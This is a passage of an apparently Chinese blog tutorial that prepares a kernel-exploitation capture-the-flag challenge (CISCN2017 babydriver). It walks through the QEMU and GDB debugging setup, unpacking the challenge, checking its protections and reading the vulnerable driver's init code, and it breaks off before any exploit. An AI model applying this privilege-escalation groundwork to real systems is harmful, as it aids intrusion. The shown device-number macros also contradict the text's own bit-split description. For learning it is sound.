<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断当前权限是否为 root，需要高权限以执行 gef-remote --qemu-mode</span></span><br><span class="line">user=$(env | grep <span class="string">"^USER"</span> | cut -d <span class="string">"="</span> -f 2)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$user</span>"</span> != <span class="string">"root"</span>  ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"请使用 root 权限执行"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制驱动至 rootfs</span></span><br><span class="line">cp ./mydrivers/*.ko busybox-1.34.1/_install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 rootfs</span></span><br><span class="line"><span class="built_in">pushd</span> busybox-1.34.1/_install</span><br><span class="line">find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -initrd ./rootfs.img \</span><br><span class="line">    -append <span class="string">"nokaslr"</span> \</span><br><span class="line">    -s  \</span><br><span class="line">    -S&amp;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -s ： 等价于 -gdb tcp::1234， 指定 qemu 的调试链接</span></span><br><span class="line">    <span class="comment"># -S ：指定 qemu 启动后立即挂起</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -nographic                # 关闭 QEMU 图形界面</span></span><br><span class="line">    <span class="comment"># -append "console=ttyS0"   # 和 -nographic 一起使用，启动的界面就变成了当前终端</span></span><br><span class="line"></span><br><span class="line">gnome-terminal -e <span class="string">'gdb -x mygdbinit'</span></span><br></pre></td></tr></table></figure>
<p>gdbinit 内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture i386:x86-64</span><br><span class="line">add-symbol-file vmlinux</span><br><span class="line">gef-remote --qemu-mode localhost:1234</span><br><span class="line"></span><br><span class="line">b start_kernel</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<h2 id="四、小试牛刀">四、小试牛刀</h2>
<blockquote>
<p>这里选用 CISCN2017_babydriver 作为笔者入门的第一题。之所以选用这一题是因为网上资料较多，方便学习。</p>
</blockquote>
<h3 id="1-题目附件">1. 题目附件</h3>
<p>题目附件可在<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar" target="_blank" rel="noopener">此处</a>下载。</p>
<p>题目给了三个文件，分别是：</p>
<ul>
<li><a href="http://boot.sh" target="_blank" rel="noopener">boot.sh</a> 启动脚本</li>
<li>bzImage 内核启动文件</li>
<li>rootfs.cpio 根文件系统镜像</li>
</ul>
<h3 id="2-尝试执行">2. 尝试执行</h3>
<p>初始时，直接解压 <code>babydriver.tar</code> 并运行启动脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">mkdir babydriver</span><br><span class="line">tar -xf babydriver.tar -C babydriver</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line"><span class="built_in">cd</span> babydriver </span><br><span class="line">./boot.sh</span><br></pre></td></tr></table></figure>
<p>但 KVM 报错，其报错信息如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Could not access KVM kernel module: No such file or directory</span><br><span class="line">qemu-system-x86_64: failed to initialize kvm: No such file or directory</span><br></pre></td></tr></table></figure>
<p>使用以下命令查看当前 linux in vmware 支不支持虚拟化，发现输出为空，即<strong>不支持</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">egrep <span class="string">'^flags.*(vmx|svm)'</span> /proc/cpuinfo</span><br></pre></td></tr></table></figure>
<p>检查了一下物理机的 Virtualization Settings, 已经全部是打开了的。再检查以下 VMware 的CPU配置，发现没有勾选 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI</code>。</p>
<p>勾选后重新启动 linux 虚拟机，提示<code>此平台不支持虚拟化的 Intel VT-x/EPT</code>…</p>
<p>经过一番百度，发现是 Hyper-V 没有禁用彻底。彻底禁用的操作如下：</p>
<ul>
<li>
<p>控制面板—程序——打开或关闭Windows功能，取消勾选Hyper-V，确定禁用Hyper-V服务</p>
</li>
<li>
<p><strong>管理员权限</strong>打开 cmd，执行 <code>bcdedit /set hypervisorlaunchtype off</code></p>
<blockquote>
<p>若想重新启用，则执行 <code>bcdedit /set hypervisorlaunchtype auto</code></p>
</blockquote>
</li>
<li>
<p>重启计算机</p>
</li>
</ul>
<p>之后再启动 linux in Vmware，其内部的 kvm 便可以正常执行了。</p>
<h3 id="3-题目分析">3. 题目分析</h3>
<h4 id="a-目的">a. 目的</h4>
<ul>
<li>
<p>查看一下根目录的 <code>/init</code> 文件，不难看出这题需要我们进行<strong>内核提权</strong>，只有提权后才可以查看  flag。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag                      <span class="comment"># flag 被设置为只有 root 可读</span></span><br><span class="line">chmod 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko   <span class="comment"># 加载漏洞驱动</span></span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nBoot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds\n"</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="b-获取目标内核模块">b. 获取目标内核模块</h4>
<blockquote>
<p>在提权之前，我们需要先把加载进内核的驱动 dump 出来，这个驱动大概率是一个存在漏洞的驱动。</p>
</blockquote>
<p>首先使用 file 命令查看一下 rootfs.cpio 的文件格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file rootfs.cpio                 </span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15   2017, max compression, from Unix, original size modulo 2^32 2844672</span><br></pre></td></tr></table></figure>
<p>可以看到是一个 gzip 格式的文件，因此我们需要给该文件改一下名称，否则 gunzip 将无法识别文件后缀。之后就是解压 gzip + 解包 cpio 的操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>
<p>解压之后的文件便是正常的 CPIO 格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file rootfs.cpio </span><br><span class="line">rootfs.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>
<p>使用常规方式给 CPIO 解包即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>解包完成后，即可在<code>/lib/modules/4.4.72/babydriver.ko</code>下找到目标驱动。</p>
<h4 id="c-查看保护">c. 查看保护</h4>
<p>首先是驱动程序保护：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec babydriver.ko</span><br><span class="line">[*] <span class="string">'/usr/class/kernel_pwn/CISCN2017-babydriver/babydriver/babydriver.ko'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>可以看到这里只开启了 NX 保护。</p>
<p>接着再看看 qemu 启动参数，发现启动了 smep 保护。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> \</span><br><span class="line">    -<span class="built_in">enable</span>-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \</span><br><span class="line">    --nographic  \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep      <span class="comment"># &lt;- 启用 +smep 保护</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>SMEP（Supervisor Mode Execution Protection 管理模式执行保护）：<strong>禁止CPU处于 ring0 模式时执行用户空间代码</strong>。</p>
<p>还有一个比较相近的保护措施是 SMAP（Superivisor Mode Access Protection 管理模式访问保护）：禁止内核CPU访问用户空间的数据。</p>
</blockquote>
<p>注意到 <strong>没有启动 kaslr</strong>。</p>
<h4 id="d-代码分析">d. 代码分析</h4>
<blockquote>
<p>第一次接触内核题，代码什么的当然需要理清楚了。这里我们一一把驱动函数代码分析过去。</p>
</blockquote>
<h5 id="1-babydriver-init">1) babydriver_init</h5>
<h6 id="1-1-关键代码">1.1) 关键代码</h6>
<p>先上代码，这里重点关注红框框住的部分（其余部分是异常处理）</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004162419135.png" alt="image-20211004162419135"></p>
<p>简单精简一下，实际关键代码如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;babydev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"babydev"</span>);</span><br><span class="line"></span><br><span class="line">cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">cdev_0.owner = &amp;_this_module;</span><br><span class="line"></span><br><span class="line">cdev_add(&amp;cdev_0, babydev_no, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">babydev_class = _class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line"></span><br><span class="line">device_create(babydev_class, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">"babydev"</span>);</span><br></pre></td></tr></table></figure>
<p>在解释上面的代码之前，我们先来简单学习一下<strong>设备文件</strong>的相关知识。</p>
<h6 id="1-2-设备号">1.2) 设备号</h6>
<p>对于<strong>所有</strong>设备文件来说，一共分为三种，分别是：</p>
<ul>
<li>字符设备（ char device），例如控制台</li>
<li>块设备（block device），例如文件系统</li>
<li>网络设备（network device），例如网卡</li>
</ul>
<p>设备文件可以通过设备文件名来访问，通常位于 /dev 目录下。<code>ls -a</code> 出来的第一个字符即说明了当前设备文件的类型：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># c 表示字符设备</span></span><br><span class="line">crw-rw-rw-   1 root tty       5,   0 Oct  3 15:03 0</span><br><span class="line"><span class="comment"># l 表示符号链接</span></span><br><span class="line">lrwxrwxrwx   1 root root          15 Oct  2 23:43 stdout -&gt; /proc/self/fd/1</span><br><span class="line"><span class="comment"># - 表示常规文件</span></span><br><span class="line">-rw-rw-r--  1 Kiprey Kiprey  203792 Jun 16  2017 babydriver.ko</span><br></pre></td></tr></table></figure>
<p>我们可以在<strong>设备文件条目</strong>中最后一次修改日期之前看到两个数字(用逗号分隔)，例如上面的 <code>5, 0</code>（这个位置通常显示的是普通文件的<strong>文件长度</strong>），对于<strong>设备文件条目</strong>的信息中，形如<code>5,0</code>这样的一对数字，分别是特定设备的<strong>主设备号</strong>和<strong>副设备号</strong>。</p>
<p>在传统意义上，<strong>主设备号</strong>标识与设备相关的<strong>驱动程序</strong>。例如，<code>/dev/null</code> 和 <code>/dev/zero</code> 都是由驱动1管理的。而多个串行终端（即 ttyX, ttySX）是由驱动4管理的。现代的Linux内核已经<strong>支持多个驱动程序共享主设备号</strong>，但是我们仍然可以看到，目前大多数设备仍然是按照<strong>一个主设备号对应一个驱动程序</strong>的方式来组织的。</p>
<p>内核<strong>使用副设备号来确定引用的是哪个设备</strong>，但副设备号的作用仅限于此，内核不会知道更多关于某个特定副设备号的信息。</p>
<p>主设备号和副设备号可同时保存与类型 <code>dev_t</code> 中，而该类型实际上是一个 <code>u32</code>；其中的12位用于保存主设备号，20位用于保存副设备号。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> u32 <span class="keyword">__kernel_dev_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__kernel_dev_t</span>    <span class="keyword">dev_t</span>;</span><br></pre></td></tr></table></figure>
<p>在编写驱动程序需要使用主副设备号时，最好不要直接进行位运算操作，而是使用 <code>&lt;linux/kdev_t.h&gt;</code> 头文件中的宏定义操作：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAJOR(dev)    ((dev)&gt;&gt;8)              <span class="comment">// 获取主设备号</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINOR(dev)    ((dev) &amp; 0xff)          <span class="comment">// 获取副设备号</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MKDEV(ma,mi)  ((ma)&lt;&lt;8 | (mi))        <span class="comment">// 从主副设备号中生成一个 dev_t 类型的变量</span></span></span><br></pre></td></tr></table></figure>
<p>设备文件相关的内容暂时到此为止，现在回归题目。</p>
<p>首先，babydriver_init 函数将会调用 <code>alloc_chrdev_region</code> 函数。该函数的函数声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alloc_chrdev_region() - register a range of char device numbers</span></span><br><span class="line"><span class="comment"> * @dev: output parameter for first assigned number</span></span><br><span class="line"><span class="comment"> * @baseminor: first of the requested range of minor numbers</span></span><br><span class="line"><span class="comment"> * @count: the number of minor numbers required</span></span><br><span class="line"><span class="comment"> * @name: the name of the associated device or driver</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Allocates a range of char device numbers.  The major number will be</span></span><br><span class="line"><span class="comment"> * chosen dynamically, and returned (along with the first minor number)</span></span><br><span class="line"><span class="comment"> * in @dev.  Returns zero or a negative error code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> *dev, <span class="keyword">unsigned</span> baseminor, <span class="keyword">unsigned</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br></pre></td></tr></table></figure>
<p>根据当前函数的调用代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;babydev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"babydev"</span>);</span><br></pre></td></tr></table></figure>
<p>我们不难看出，babydriver_init 函数尝试向内核申请一个<strong>字符设备</strong>的新的<strong>主设备号</strong>，其中副设备号从0开始，设备名称为 <code>babydev</code>，并将申请到的主副设备号存入 babydev_no 全局变量中。</p>
<blockquote>
<p>还有一个名为<code>register_chrdev_region</code>的函数，它在调用时需要指定<strong>主副设备号的起始值</strong>，要求内核在起始值的基础上进行分配，与 <code>alloc_chrdev_region</code>功能相似但又有所不同。</p>
</blockquote>
<p>设备号分配完成后，我们需要将其连接到实现设备操作的内部函数。</p>
<h6 id="1-3-注册字符设备">1.3) 注册字符设备</h6>
<p>内核使用 <code>cdev</code> 类型的结构来表示字符设备，因此在操作设备之前，内核必须<strong>初始化</strong>+<strong>注册</strong>一个这样的结构体。</p>
<blockquote>
<p>注意，一个驱动程序可以分配不止一个设备号，创建不止一个设备。</p>
</blockquote>
<p>该函数的执行代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cdev_init(&amp;cdev_0, &amp;fops);</span><br></pre></td></tr></table></figure>
<p>cdev 结构体的初始化函数如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cdev_init() - initialize a cdev structure</span></span><br><span class="line"><span class="comment"> * @cdev: the structure to initialize</span></span><br><span class="line"><span class="comment"> * @fops: the file_operations for this device</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Initializes @cdev, remembering @fops, making it ready to add to the</span></span><br><span class="line"><span class="comment"> * system with cdev_add().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_init</span><span class="params">(struct cdev *cdev, <span class="keyword">const</span> struct file_operations *fops)</span></span></span><br></pre></td></tr></table></figure>
<p>正如注释中写到，传入的 cdev 指针所对应的 <code>struct cdev</code> 将会被初始化，同时<strong>设置该设备的各类操作</strong>为传入的 <code>file_operations</code>结构体指针。</p>
<p><code>file_operations</code>结构体中包含了大量的函数指针：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">  <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">  <span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">  <span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">  <span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">  <span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">  <span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">  <span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">  <span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_supported_flags;</span><br><span class="line">  <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">  <span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">  <span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">  <span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span> datasync);</span><br><span class="line">  <span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line">  <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line">  <span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **, <span class="keyword">void</span> **);</span><br><span class="line">  <span class="keyword">long</span> (*fallocate)(struct file *file, <span class="keyword">int</span> mode, <span class="keyword">loff_t</span> offset,</span><br><span class="line">        <span class="keyword">loff_t</span> len);</span><br><span class="line">  <span class="keyword">void</span> (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">  <span class="keyword">unsigned</span> (*mmap_capabilities)(struct file *);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">ssize_t</span> (*copy_file_range)(struct file *, <span class="keyword">loff_t</span>, struct file *,</span><br><span class="line">      <span class="keyword">loff_t</span>, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">loff_t</span> (*remap_file_range)(struct file *file_in, <span class="keyword">loff_t</span> pos_in,</span><br><span class="line">           struct file *file_out, <span class="keyword">loff_t</span> pos_out,</span><br><span class="line">           <span class="keyword">loff_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> remap_flags);</span><br><span class="line">  <span class="keyword">int</span> (*fadvise)(struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>但在这道题中我们只会用到其中的一小部分，即 <code>/baby(open|release|read|write|ioctl)/</code>。</p>
<blockquote>
<p>struct file_operations 中的 owner 指针是必须指向当前内核模块的指针，可以使用宏定义 <code>THIS_MODULE</code> 来获取该指针。</p>
</blockquote>
<p>当 cdev 结构体初始化完成后，最后的一步就是使用 <code>cdev_add</code> 告诉内核该设备的设备号。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cdev_add(&amp;cdev_0, babydev_no, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>其中，<code>cdev_add</code> 函数声明如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cdev_add() - add a char device to the system</span></span><br><span class="line"><span class="comment"> * @p: the cdev structure for the device</span></span><br><span class="line"><span class="comment"> * @dev: the first device number for which this device is responsible</span></span><br><span class="line"><span class="comment"> * @count: the number of consecutive minor numbers corresponding to this</span></span><br><span class="line"><span class="comment"> *         device</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * cdev_add() adds the device represented by @p to the system, making it</span></span><br><span class="line"><span class="comment"> * live immediately.  A negative error code is returned on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cdev_add</span><span class="params">(struct cdev *p, <span class="keyword">dev_t</span> dev, <span class="keyword">unsigned</span> count)</span></span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，一旦 <code>cdev_add</code> 函数执行完成，则当前 cdev 设备<strong>立即处于活动状态</strong>，其<strong>操作可以立即被内核调用</strong>。因此在编写驱动程序时，务必保证在驱动程序完全准备好处理设备上的操作之后，最后再来调用 <code>cdev_add</code>。</p>
<h6 id="1-4-将设备注册进-sysfs">1.4) 将设备注册进 sysfs</h6>
<p>当驱动模块已经将 cdev 注册进内核后，该函数将会执行以下代码，来将当前设备的设备结点注册进  sysfs 中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">babydev_class = class_create(THIS_MODULE, <span class="string">"babydev"</span>);</span><br><span class="line">device_create(babydev_class, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">"babydev"</span>);</span><br></pre></td></tr></table></figure>
<p>其中，函数 <code>class_create</code> 和 <code>device_create</code> 的声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is a #define to keep the compiler from merging different</span></span><br><span class="line"><span class="comment"> * instances of the __key variable */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> class_create(owner, name)    \</span></span><br><span class="line">(&#123;            \</span><br><span class="line">  <span class="keyword">static</span> struct lock_class_key __key;  \</span><br><span class="line">  __class_create(owner, name, &amp;__key);  \</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * class_create - create a struct class structure</span></span><br><span class="line"><span class="comment"> * @owner: pointer to the module that is to "own" this struct class</span></span><br><span class="line"><span class="comment"> * @name: pointer to a string for the name of this class.</span></span><br><span class="line"><span class="comment"> * @key: the lock_class_key for this class; used by mutex lock debugging</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is used to create a struct class pointer that can then be used</span></span><br><span class="line"><span class="comment"> * in calls to device_create().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns &amp;struct class pointer on success, or ERR_PTR() on error.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note, the pointer created here is to be destroyed when finished by</span></span><br><span class="line"><span class="comment"> * making a call to class_destroy().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">class</span> *__<span class="title">class_create</span>(<span class="title">struct</span> <span class="title">module</span> *<span class="title">owner</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>,</span></span><br><span class="line"><span class="class">           <span class="title">struct</span> <span class="title">lock_class_key</span> *<span class="title">key</span>)</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">/**</span></span><br><span class="line"><span class="class"> * <span class="title">device_create</span> - <span class="title">creates</span> <span class="title">a</span> <span class="title">device</span> <span class="title">and</span> <span class="title">registers</span> <span class="title">it</span> <span class="title">with</span> <span class="title">sysfs</span></span></span><br><span class="line"><span class="class"> * @<span class="title">class</span>:</span> pointer to the <span class="class"><span class="keyword">struct</span> <span class="title">class</span> <span class="title">that</span> <span class="title">this</span> <span class="title">device</span> <span class="title">should</span> <span class="title">be</span> <span class="title">registered</span> <span class="title">to</span></span></span><br><span class="line"><span class="class"> * @<span class="title">parent</span>:</span> pointer to the parent <span class="class"><span class="keyword">struct</span> <span class="title">device</span> <span class="title">of</span> <span class="title">this</span> <span class="title">new</span> <span class="title">device</span>, <span class="title">if</span> <span class="title">any</span></span></span><br><span class="line"><span class="class"> * @<span class="title">devt</span>:</span> the <span class="keyword">dev_t</span> <span class="keyword">for</span> the <span class="keyword">char</span> device to be added</span><br><span class="line"> * @drvdata: the data to be added to the device <span class="keyword">for</span> callbacks</span><br><span class="line"> * @fmt: <span class="built_in">string</span> <span class="keyword">for</span> the device<span class="number">'</span>s name</span><br><span class="line"> *</span><br><span class="line"> * This function can be used by <span class="keyword">char</span> device classes.  A <span class="class"><span class="keyword">struct</span> <span class="title">device</span></span></span><br><span class="line"><span class="class"> * <span class="title">will</span> <span class="title">be</span> <span class="title">created</span> <span class="title">in</span> <span class="title">sysfs</span>, <span class="title">registered</span> <span class="title">to</span> <span class="title">the</span> <span class="title">specified</span> <span class="title">class</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">A</span> "<span class="title">dev</span>" <span class="title">file</span> <span class="title">will</span> <span class="title">be</span> <span class="title">created</span>, <span class="title">showing</span> <span class="title">the</span> <span class="title">dev_t</span> <span class="title">for</span> <span class="title">the</span> <span class="title">device</span>, <span class="title">if</span></span></span><br><span class="line"><span class="class"> * <span class="title">the</span> <span class="title">dev_t</span> <span class="title">is</span> <span class="title">not</span> 0,0.</span></span><br><span class="line"><span class="class"> * <span class="title">If</span> <span class="title">a</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">a</span> <span class="title">parent</span> <span class="title">struct</span> <span class="title">device</span> <span class="title">is</span> <span class="title">passed</span> <span class="title">in</span>, <span class="title">the</span> <span class="title">newly</span> <span class="title">created</span></span></span><br><span class="line"><span class="class"> * <span class="title">struct</span> <span class="title">device</span> <span class="title">will</span> <span class="title">be</span> <span class="title">a</span> <span class="title">child</span> <span class="title">of</span> <span class="title">that</span> <span class="title">device</span> <span class="title">in</span> <span class="title">sysfs</span>.</span></span><br><span class="line"><span class="class"> * <span class="title">The</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">the</span> <span class="title">struct</span> <span class="title">device</span> <span 